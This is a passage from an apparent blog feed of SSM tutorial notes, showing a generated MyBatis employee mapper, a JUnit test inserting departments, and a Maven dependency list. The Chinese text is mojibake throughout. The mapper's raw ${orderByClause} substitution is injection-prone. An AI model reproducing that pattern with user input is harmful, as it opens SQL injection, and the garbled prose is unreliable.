class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Base_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"orderByClause != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      order by $</span><span class="template-variable">&#123;orderByClause&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"java.lang.Integer"</span> <span class="attr">resultMap</span>=<span class="string">"BaseResultMap"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select </span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Base_Column_List"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    from tbl_emp</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">"deleteByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"java.lang.Integer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    delete from tbl_emp</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">"deleteByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    delete from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insert"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    insert into tbl_emp (emp_id, emp_name, gender, </span></span><br><span class="line"><span class="xml">      email, d_id)</span></span><br><span class="line"><span class="xml">    values (#</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">, </span></span><br><span class="line"><span class="xml">      #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">, #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">)</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">"insertSelective"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    insert into tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"("</span> <span class="attr">suffix</span>=<span class="string">")"</span> <span class="attr">suffixOverrides</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_id,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">trim</span> <span class="attr">prefix</span>=<span class="string">"values ("</span> <span class="attr">suffix</span>=<span class="string">")"</span> <span class="attr">suffixOverrides</span>=<span class="string">","</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">trim</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"countByExample"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.EmployeeExample"</span> <span class="attr">resultType</span>=<span class="string">"java.lang.Long"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    select count(*) from tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByExampleSelective"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.empId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_id = #</span><span class="template-variable">&#123;record.empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name = #</span><span class="template-variable">&#123;record.empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender = #</span><span class="template-variable">&#123;record.gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email = #</span><span class="template-variable">&#123;record.email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"record.dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id = #</span><span class="template-variable">&#123;record.dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Update_By_Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByExample"</span> <span class="attr">parameterType</span>=<span class="string">"map"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    set emp_id = #</span><span class="template-variable">&#123;record.empId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      emp_name = #</span><span class="template-variable">&#123;record.empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      gender = #</span><span class="template-variable">&#123;record.gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      email = #</span><span class="template-variable">&#123;record.email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      d_id = #</span><span class="template-variable">&#123;record.dId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"_parameter != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">"Update_By_Example_Where_Clause"</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByPrimaryKeySelective"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"empName != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        emp_name = #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"gender != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        gender = #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"email != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        email = #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">"dId != null"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        d_id = #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">"updateByPrimaryKey"</span> <span class="attr">parameterType</span>=<span class="string">"com.ceit.crud.bean.Employee"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    update tbl_emp</span></span><br><span class="line"><span class="xml">    set emp_name = #</span><span class="template-variable">&#123;empName,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      gender = #</span><span class="template-variable">&#123;gender,jdbcType=CHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      email = #</span><span class="template-variable">&#123;email,jdbcType=VARCHAR&#125;</span><span class="xml">,</span></span><br><span class="line"><span class="xml">      d_id = #</span><span class="template-variable">&#123;dId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">    where emp_id = #</span><span class="template-variable">&#123;empId,jdbcType=INTEGER&#125;</span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">update</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><h2 id="æµ‹è¯•è¿‡ç¨‹"><a href="#æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h2><p>æ¥ä¸‹æ¥å°±åˆ›å»ºä¸€ä¸ªMapperTest.javaæ¥ç®€å•æµ‹è¯•ä¸€ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.crud.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.Department;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.bean.DepartmentExample;</span><br><span class="line"><span class="keyword">import</span> com.ceit.crud.dao.DepartmentMapper;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.junit.runner.RunWith;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.ContextConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.test.context.junit4.SpringJUnit4ClassRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MapperTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æµ‹è¯•DepartmentMapper</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testCRUD</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//1.åˆ›å»ºSpringIOCå®¹å™¨</span></span><br><span class="line">        ApplicationContext ioc=<span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"applicationContext.xml"</span>);</span><br><span class="line">        <span class="comment">//2.ä»å®¹å™¨ä¸­è·å–mapper</span></span><br><span class="line">        DepartmentMapper bean = ioc.getBean(DepartmentMapper<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(bean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.æ’å…¥å‡ ä¸ªéƒ¨é—¨</span></span><br><span class="line">        bean.insertSelective(<span class="keyword">new</span> Department(<span class="keyword">null</span>,<span class="string">"å¼€å‘éƒ¨"</span>));</span><br><span class="line">        bean.insertSelective(<span class="keyword">new</span> Department(<span class="keyword">null</span>,<span class="string">"æµ‹è¯•éƒ¨"</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œå®Œæˆåï¼ŒæŸ¥çœ‹æ•°æ®åº“å·²ç»å‘ç”Ÿå˜åŒ–ï¼Œæ’å…¥æˆåŠŸ</p><p>å‰©ä¸‹çš„åŸºæœ¬ä¸Šå°±æ˜¯åŸºæœ¬æ“ä½œäº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Mybatisè¿è¡Œ&quot;&gt;&lt;a href=&quot;#Mybatisè¿è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;Mybatisè¿è¡Œ&quot;&gt;&lt;/a&gt;Mybatisè¿è¡Œ&lt;/h1&gt;&lt;p&gt;é¦–å…ˆè¿è¡Œä¸€ä¸‹MyBatisç”Ÿæˆä¸€ä¸‹mapperæ–‡ä»¶&lt;br&gt;å»ºä¸€ä¸ªjavaæ–‡ä»¶&lt;br&gt;
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/9/17-ç¯å¢ƒæ­å»º</title>
    <link href="http://yoursite.com/2020/09/17/SSM-2020-9-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/09/17/SSM-2020-9-17-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-09-17T08:00:44.000Z</published>
    <updated>2021-02-21T04:58:04.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åŸºç¡€ç¯å¢ƒæ­å»º"><a href="#åŸºç¡€ç¯å¢ƒæ­å»º" class="headerlink" title="åŸºç¡€ç¯å¢ƒæ­å»º"></a>åŸºç¡€ç¯å¢ƒæ­å»º</h1><ol><li><p>åˆ›å»ºä¸€ä¸ªmavenå·¥ç¨‹</p></li><li><p>å¼•å…¥é¡¹ç›®ä¾èµ–çš„jaråŒ…</p><ul><li>spring</li><li>springmvc</li><li>mybatis</li><li>æ•°æ®åº“è¿æ¥æ± ï¼Œé©±åŠ¨åŒ…</li><li>å…¶ä»–(jstl,servlet-api,junit)</li></ul></li><li><p>å¼•å…¥bootstrapå‰ç«¯æ¡†æ¶</p></li><li><p>ç¼–å†™ssmæ•´åˆçš„å…³é”®é…ç½®æ–‡ä»¶</p><ul><li>web.xml,spring,springmvc,mybatis,ä½¿ç”¨mybatisçš„é€†å‘å·¥ç¨‹ç”Ÿæˆå¯¹åº”çš„beanä»¥åŠmapper</li></ul></li></ol><h2 id="jaråŒ…å¯¼å…¥"><a href="#jaråŒ…å¯¼å…¥" class="headerlink" title="jaråŒ…å¯¼å…¥"></a>jaråŒ…å¯¼å…¥</h2><p>åœ¨pom.xmlæ–‡ä»¶ä¸­åŠ è½½ä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- å¼•å…¥é¡¹ç›®ä¾èµ–çš„jaråŒ…--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- SpringMVC Spring Mybatis   --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring mvc--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--spring jdbc--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- springé¢å‘åˆ‡é¢ç¼–ç¨‹--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.9.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MyBatis--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--MyBatisæ•´åˆSpringçš„é€‚é…åŒ… --&gt;</span></span><br><span class="line">    <span 